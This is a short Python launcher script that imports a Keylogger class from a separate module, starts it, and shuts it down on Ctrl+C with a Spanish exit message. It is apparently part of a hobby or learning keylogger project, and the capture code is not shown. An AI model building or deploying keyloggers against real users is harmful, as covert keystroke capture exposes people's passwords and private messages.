#!/usr/bin/env python3

from keylogger import Keylogger
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\nSaliendo...", 'red'))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
